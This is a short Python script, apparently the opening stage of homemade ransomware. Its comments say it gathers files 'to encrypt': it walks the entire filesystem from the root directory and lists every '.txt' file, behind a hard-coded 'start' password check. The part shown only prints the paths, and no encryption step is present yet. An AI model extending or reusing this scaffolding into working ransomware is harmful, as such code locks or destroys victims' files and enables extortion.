#!/usr/bin/python3

#put a safeguard at the beginning or programming for testing purposes
#supply file extensions to encrypt
#grab all files from machine andd put them in a list


import os

#safeguard password
safeguard = input("Please enter the safeguard password: ")
if safeguard != 'start':
	quit();

#file extensions to encrypt
encrypted_ext = ('.txt',)

#grab all files from the machine
#walk() generates the file names in a directory tree by walking the tree
file_paths = []
for  root, dirs, files in os.walk('/'):
	for file in files:
		file_path, file_ext = os.path.splitext(root+'/'+file)
		if file_ext in encrypted_ext:
			file_paths.append(root+'/'+file)

for f in file_paths:
	print(f)
